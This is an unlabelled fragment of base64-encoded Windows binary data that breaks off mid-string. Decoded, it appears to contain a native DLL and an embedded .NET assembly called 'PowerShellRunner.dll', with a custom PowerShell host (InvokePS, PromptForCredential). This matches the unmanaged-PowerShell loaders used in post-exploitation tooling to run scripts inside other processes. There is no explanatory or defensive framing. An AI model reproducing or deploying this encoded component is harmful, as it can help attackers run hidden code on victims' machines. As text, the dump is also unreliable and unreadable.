5nVHlwZVcAAEEDSGVhcFNpemUAAJkDTENNYXBTdHJpbmdXAAB/AENsb3NlSGFuZGxlADAFU2V0U3RkSGFuZGxlAAAMBVNldEZpbGVQb2ludGVyRXgAAPAFV3JpdGVDb25zb2xlVwDCAENyZWF0ZUZpbGVXAB4GbHN0cmxlbkEAALUDTG9jYWxGcmVlAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMqLfLZkrAADNXSDSZtT//wADAoABAAAAAAAAAAAAAAAAAwKAAQAAAAEBAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAWAAAAAgAAAAIAAAADAAAAAgAAAAQAAAAYAAAABQAAAA0AAAAGAAAACQAAAAcAAAAMAAAACAAAAAwAAAAJAAAADAAAAAoAAAAHAAAACwAAAAgAAAAMAAAAFgAAAA0AAAAWAAAADwAAAAIAAAAQAAAADQAAABEAAAASAAAAEgAAAAIAAAAhAAAADQAAADUAAAACAAAAQQAAAA0AAABDAAAAAgAAAFAAAAARAAAAUgAAAA0AAABTAAAADQAAAFcAAAAWAAAAWQAAAAsAAABsAAAADQAAAG0AAAAgAAAAcAAAABwAAAByAAAACQAAAAYAAAAWAAAAgAAAAAoAAACBAAAACgAAAIIAAAAJAAAAgwAAABYAAACEAAAADQAAAJEAAAApAAAAngAAAA0AAAChAAAAAgAAAKQAAAALAAAApwAAAA0AAAC3AAAAEQAAAM4AAAACAAAA1wAAAAsAAAAYBwAADAAAAAwAAAAIAAAA/////wAAAAAAAAAAAAAAAP//////////gAoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/////AAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQAAAAAAAAICAgICAgICAgICAgICAgICAgICAgICAgICAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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pvKQAACiYqZgACewMAAARyNwMAcAMoKAAACm8pAAAKJio+AAJ7AwAABANvKQAACiYqZgACewMAAARyRwMAcAMoKAAACm8pAAAKJipmAAJ7AwAABHJbAwBwAygoAAAKbykAAAomKhIAKwAqEzABABEAAAADAAARAAJ7AwAABG8qAAAKCisABioyAHJvAwBwcyIAAAp6MgBy0gQAcHMiAAAKejIAckcGAHBzIgAACnoyAHLGBwBwcyIAAAp6AAAAEzABAAwAAAAHAAARAAJ7BAAABAorAAYqMgByRQkAcHMiAAAKejIAcqwKAHBzIgAACnoAABMwAQAMAAAACAAAEQACewkAAAQKKwAGKiYAAgN9CQAABCoAABMwAQAMAAAACQAAEQACewwAAAQKKwAGKiYAAgN9DAAABCoAABMwAQAMAAAACgAAEQACewYAAAQKKwAGKiYAAgN9BgAABCoAABMwAQAMAAAACwAAEQACewcAAAQKKwAGKiYAAgN9BwAABCoyAHIvDABwcyIAAAp6ABMwAQAMAAAACAAAEQACewgAAAQKKwAGKiYAAgN9CAAABCoyAHJ5DABwcyIAAAp6MgByxQwAcHMiAAAKehMwAQAMAAAACQAAEQACewoAAAQKKwAGKhMwAQAMAAAACQAAEQACewsAAAQKKwAGKjIAcgcNAHBzIgAACnoyAHJsDgBwcyIAAAp6MgByvA4AcHMiAAAKejIAcggPAHBzIgAACnoTMAEADAAAAAoAABEAAnsNAAAECisABiomAAIDfQ0AAAQqAAATMAEADAAAAAkAABEAAnsFAAAECisABiomAAIDfQUAAAQqAAATMAEADAAAAAMAABEAAnsOAAAECisABiomAAIDfQ4AAAQqAAATMAMAAgEAAAwAABECEgD+FRQAAAESAB94KCsAAAoAEgAfZCgsAAAKAAZ9BQAABAISAf4VFQAAARIBFigtAAAKABIBFiguAAAKAAd9BgAABAIXfQcAAAQCHw99CAAABAIWfQkAAAQCEgL+FRQAAAESAiD///9/KCsAAAoAEgIg////fygsAAAKAAh9CgAABAISA/4VFAAAARIDH2QoKwAACgASAx9kKCwAAAoACX0LAAAEAhIE/hUUAAABEgQfZCgrAAAKABIEIOgDAAAoLAAACgARBH0MAAAEAhIF/hUVAAABEgUWKC0AAA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cAAAQA7QcAAAEAywcAAAIA7QcAAAEA8gcAAAIA+QcAAAEATwcAAAEATwcAAAEATwfRAAYBagDZAAYBagDhAAYBagDpAAYBagDxAAYBagD5AAYBagABAQYBagAJAQYBagARAQYBQgEZAQYBagAhAQYBagApAQYBagAxAQYBRwFBAQYBPABJAQYBGABRAS4KTgFRAVEKVAFhAYMKWwFpAZIKGABpAaAKZgFxAcEKbAF5Ac4KagAMAOAKegGBAf0KgAF5AQwLagBxARALigGRASMLGAARAEkBMgAJAAYBGAAxAAYBrQGZAUMLvQGZAXEBNwCZAYQBNwChAQYBagApAG0LyAERAAYBGAAZAAYBGABBAAYBGABBAHULzQGpAYML0wFBAIoLzQEJAJULKQChAJ4LPAChAKgLPACpALMLPACpALkLPAAhAAYBGAAuAAsAAAIuABMAFgIuABsAFgIuACMAFgIuACsAAAIuADMAHAIuADsAFgIuAEsAFgIuAFMANAIuAGMAXgIuAGsAawIuAHMAdAIuAHsAfQKTAaQBqQGzAbgBwwHZAd4B4wHoAe0B8QEDAAEABAAHAAUACQAAAPYBQQAAAAECRgAAADUBSgAAAAYCTwAAAAkCVAAAABgCVAAAAPoDRgAAAAEEtQAAAIIGKwEAAJIGMAEAAJ0GNQEAAKwGOgEAALcGKwEAAMcGPgEAANQGMAEAAOoGMAEAAPgGNQEAAAcHMAEAABIHRgACAAMAAwACAAQABQACAAUABwACAAYACQACAAcACwACAAgADQACABoADwACAB8AEQACACIAEwABACMAEwACACQAFQABACUAFQABACcAFwACACYAFwABACkAGQACACgAGQACACsAGwABACwAGwACAC4AHQACAC8AHwACADAAIQACADUAIwABADYAIwACADcAJQABADgAJQACADkAJwABADoAJwByAQSAAAABAAAAAAAAAAAAAAAAAB8AAAACAAAAAAAAAAAAAAABAHUAAAAAAAEAAAAAAAAAAAAAAAoAjAAAAAAAAwACAAQAAgAFAAIAAAAAPE1vZHVsZT4AUG93ZXJTaGVsbFJ1bm5lci5kbGwAUG93ZXJTaGVsbFJ1bm5lcgBDdXN0b21QU0hvc3QAQ3VzdG9tUFNIb3N0VXNlckludGVyZmFjZQBDdXN0b21QU1JIb3N0UmF3VXNlckludGVyZmFjZQBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0AFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24AU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5Ib3N0AFBTSG9zdABQU0hvc3RVc2VySW50ZXJmYWNlAFBTSG9zdFJhd1VzZXJJbnRlcmZhY2UASW52b2tlUFMALmN0b3IAR3VpZABfaG9zdElkAF91aQBnZXRfSW5zdGFuY2VJZABnZXRfTmFtZQBWZXJzaW9uAGdldF9WZXJzaW9uAGdldF9VSQBTeXN0ZW0uR2xvYmFsaXphdGlvbgBDdWx0dXJlSW5mbwBnZXRfQ3VycmVudEN1bHR1cmUAZ2V0X0N1cnJlbnRVSUN1bHR1cmUARW50ZXJOZXN0ZWRQcm9tcHQARXhpdE5lc3RlZFByb21wdABOb3RpZnlCZWdpbkFwcGxpY2F0aW9uAE5vdGlmeUVuZEFwcGxpY2F0aW9uAFNldFNob3VsZEV4aXQASW5zdGFuY2VJZABOYW1lAFVJAEN1cnJlbnRDdWx0dXJlAEN1cnJlbnRVSUN1bHR1cmUAU3lzdGVtLlRleHQAU3RyaW5nQnVpbGRlcgBfc2IAX3Jhd1VpAENvbnNvbGVDb2xvcgBXcml0ZQBXcml0ZUxpbmUAV3JpdGVEZWJ1Z0xpbmUAV3JpdGVFcnJvckxpbmUAV3JpdGVWZXJib3NlTGluZQBXcml0ZVdhcm5pbmdMaW5lAFByb2dyZXNzUmVjb3JkAFdyaXRlUHJvZ3Jlc3MAZ2V0X091dHB1dABTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYwBEaWN0aW9uYXJ5YDIAUFNPYmplY3QAU3lzdGVtLkNvbGxlY3Rpb25zLk9iamVjdE1vZGVsAENvbGxlY3Rpb25gMQBGaWVsZERlc2NyaXB0aW9uAFByb21wdABDaG9pY2VEZXNjcmlwdGlvbgBQcm9tcHRGb3JDaG9pY2UAUFNDcmVkZW50aWFsAFBTQ3JlZGVudGlhbFR5cGVzAFBTQ3JlZGVudGlhbFVJT3B0aW9ucwBQcm9tcHRGb3JDcmVkZW50aWFsAGdldF9SYXdVSQBSZWFkTGluZQBTeXN0ZW0uU2VjdXJpdHkAU2VjdXJlU3RyaW5nAFJlYWRMaW5lQXNTZWN1cmVTdHJpbmcAT3V0cHV0AFJhd1VJAFNpemUAX3dpbmRvd1NpemUAQ29vcmRpbmF0ZXMAX2N1cnNvclBvc2l0aW9uAF9jdXJzb3JTaXplAF9mb3JlZ3JvdW5kQ29sb3IAX2JhY2tncm91bmRDb2xvcgBfbWF4UGh5c2ljYWxXaW5kb3dTaXplAF9tYXhXaW5kb3dTaXplAF9idWZmZX